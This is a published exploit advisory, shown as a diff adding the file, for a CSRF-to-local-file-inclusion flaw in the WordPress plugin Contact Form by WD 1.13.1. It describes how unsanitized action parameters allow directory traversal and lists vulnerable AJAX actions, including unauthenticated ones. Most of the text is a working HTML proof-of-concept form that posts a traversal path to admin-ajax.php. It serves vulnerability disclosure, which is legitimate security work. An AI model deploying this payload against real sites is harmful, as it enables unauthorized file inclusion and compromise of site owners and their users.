@@ -1,0 +1,141 @@
+# Exploit Title: Contact Form by WD [CSRF → LFI]
+# Date: 2019-03-17
+# Exploit Author: Panagiotis Vagenas
+# Vendor Homepage: http://web-dorado.com/
+# Software Link: https://wordpress.org/plugins/contact-form-maker
+# Version: 1.13.1
+# Tested on: WordPress 5.1.1
+
+Description
+-----------
+
+Plugin implements the following AJAX actions:
+
+- `manage_fm`
+- `get_stats`
+- `generete_csv`
+- `generete_xml`
+- `formmakerwdcaptcha`
+- `nopriv_formmakerwdcaptcha`
+- `formmakerwdmathcaptcha`
+- `nopriv_formmakerwdmathcaptcha`
+- `product_option`
+- `FormMakerEditCountryinPopup`
+- `FormMakerMapEditinPopup`
+- `FormMakerIpinfoinPopup`
+- `show_matrix`
+- `FormMakerSubmits`
+- `FormMakerSQLMapping`
+- `select_data_from_db`
+- `manage`
+
+All of them call the function `form_maker_ajax_fmc`. This function
+dynamicaly loads a file defined in `$_GET['action']` or
+`$_POST['action']` if the former is not defined. Because of the way
+WordPress defines the AJAX action a user could define the plugin action
+in the `$_GET['action']` and AJAX action in `$_POST['action']`.
+Leveraging that and the fact that no sanitization is performed on the
+`$_GET['action']`, a malicious actor can perform a CSRF attack to load a
+file using directory traversal thus leading to Local File Inclusion
+vulnerability.
+
+The following AJAX actions are available only for the paid version of
+the plugin:
+
+- `paypal_info`
+- `checkpaypal`
+- `nopriv_checkpaypal`
+- `get_frontend_stats`
+- `nopriv_get_frontend_stats`
+- `frontend_show_map`
+- `nopriv_frontend_show_map`
+- `frontend_show_matrix`
+- `nopriv_frontend_show_matrix`
+- `frontend_paypal_info`
+- `nopriv_frontend_paypal_info`
+- `frontend_generate_csv`
+- `nopriv_frontend_generate_csv`
+- `frontend_generate_xml`
+- `nopriv_frontend_generate_xml`
+- `FMShortocde`
+- `wd_bp_dismiss`
+
+In both free and paid versions, there are no-privilege actions that can
+be exploited by unauthenticated users in order to include local files.
+
+PoC
+---
+
+```html
+<form method="post"
+action="http://wp-csrf-new.test/wp-admin/admin-ajax.php?action=../../../../../index.php">
+    <label>AJAX action:
+        <select name="action">
+            <optgroup label="Free version">
+                <option value="FMShortocde_fmc">FMShortocde_fmc</option>
+                <option
+value="FormMakerEditCountryinPopup_fmc">FormMakerEditCountryinPopup_fmc</option>
+                <option
+value="FormMakerIpinfoinPopup_fmc">FormMakerIpinfoinPopup_fmc</option>
+                <option
+value="FormMakerMapEditinPopup_fmc">FormMakerMapEditinPopup_fmc</option>
+                <option
+value="FormMakerSQLMapping_fmc">FormMakerSQLMapping_fmc</option>
+                <option
+value="FormMakerSubmits_fmc">FormMakerSubmits_fmc</option>
+                <option
+value="formmakerwdcaptcha_fmc">formmakerwdcaptcha_fmc</option>
+                <option
+value="formmakerwdmathcaptcha_fmc">formmakerwdmathcaptcha_fmc</option>
+                <option
+value="frontend_show_matrix_fmc">frontend_show_matrix_fmc</option>
+                <option value="generete_csv_fmc">generete_csv_fmc</option>
+                <option value="generete_xml_fmc">generete_xml_fmc</option>
+                <option value="get_stats_fmc">get_stats_fmc</option>
+                <option value="manage_fmc">manage_fmc</option>
+                <option value="manage_fm_fmc">manage_fm_fmc</option>
+                <option
+value="nopriv_formmakerwdcaptcha_fmc">nopriv_formmakerwdcaptcha_fmc</option>
+                <option
+value="nopriv_formmakerwdmathcaptcha_fmc">nopriv_formmakerwdmathcaptcha_fmc</option>
+                <option
+value="product_option_fmc">product_option_fmc</option>
+                <option
+value="select_data_from_db_fmc">select_data_from_db_fmc</option>
+                <option value="wd_bp_dismiss_fmc">wd_bp_dismiss_fmc</option>
+            </optgroup>
+            <optgroup label="Pro Version">
+                <option value="paypal_info_fmc">paypal_info_fmc</option>
+                <option value="checkpaypal_fmc">checkpaypal_fmc</option>
+                <option
+value="nopriv_checkpaypal_fmc">nopriv_checkpaypal_fmc</option>
+                <option
+value="nopriv_get_frontend_stats_fmc">nopriv_get_frontend_stats_fmc</option>
+                <option
+value="get_frontend_stats_fmc">get_frontend_stats_fmc</option>
+                <option
+value="frontend_show_map_fmc">frontend_show_map_fmc</option>
+                <option
+value="nopriv_frontend_show_map_fmc">nopriv_frontend_show_map_fmc</option>
+                <option value="show_matrix_fmc">show_matrix_fmc</option>
+                <option
+value="nopriv_frontend_show_matrix_fmc">nopriv_frontend_show_matrix_fmc</option>
+                <option
+value="frontend_paypal_info_fmc">frontend_paypal_info_fmc</option>
+                <option
+value="nopriv_frontend_paypal_info_fmc">nopriv_frontend_paypal_info_fmc</option>
+                <option
+value="frontend_generate_csv_fmc">frontend_generate_csv_fmc</option>
+                <option
+value="nopriv_frontend_generate_csv_fmc">nopriv_frontend_generate_csv_fmc</option>
+                <option
+value="frontend_generate_xml_fmc">frontend_generate_xml_fmc</option>
+                <option
+value="nopriv_frontend_generate_xml_fmc">nopriv_frontend_generate_xml_fmc</option>
+            </optgroup>
+        </select>
+    </label>
+    <button type="submit" value="Submit">Submit</button>
+</form>
+
+```
